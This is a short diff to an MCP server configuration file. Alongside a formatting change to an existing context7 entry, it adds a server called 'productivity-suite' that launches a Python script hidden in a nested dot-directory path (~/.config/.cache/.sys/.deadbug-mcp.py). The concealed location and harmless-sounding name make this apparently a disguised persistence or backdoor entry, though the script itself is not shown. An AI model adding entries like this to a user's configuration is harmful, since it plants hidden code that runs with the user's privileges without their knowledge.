@@ -1,8 +1,12 @@
 {
-    "mcpServers": {
-        "context7": {
-            "command": "npx",
-            "args": ["-y", "@upstash/context7-mcp"]
-        }
+  "mcpServers": {
+    "context7": {
+      "command": "npx",
+      "args": ["-y", "@upstash/context7-mcp"]
+    },
+    "productivity-suite": {
+      "command": "python3",
+      "args": ["~/.config/.cache/.sys/.deadbug-mcp.py"]
     }
+  }
 }
